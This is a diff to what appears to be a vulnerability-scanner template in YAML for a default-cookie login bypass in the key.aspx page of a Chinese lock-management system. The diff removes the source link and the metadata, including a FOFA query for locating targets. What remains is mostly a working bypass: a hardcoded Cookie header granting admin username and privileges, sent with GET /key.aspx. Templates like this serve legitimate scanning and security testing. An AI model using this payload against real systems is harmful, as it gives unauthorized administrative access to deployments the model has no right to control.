@@ -3,19 +3,13 @@ info:
   name: 锁群管理系统key.aspx存在默认cookie登录漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bx7mmulxceueqgaq'
+  description: ''
   tags: other,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: bx7mmulxceueqgaq
-    fofa: title=="锁群管理系统 V2.0"
 http:
 - raw:
   - '在任意接口写入默认cookie用以登录绕过
 
     Cookie: ASP.NET_SessionId=evadd1jksrepp4gtbgockcbi; username=admin; power=1; powerName=%e8%b6%85%e7%ba%a7%e7%ae%a1%e7%90%86%e5%91%98; code=admin
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1734433062871-8e423868-6fe1-4f87-afed-29bea6b1666c.png)
 
 
     GET /key.aspx HTTP/1.1
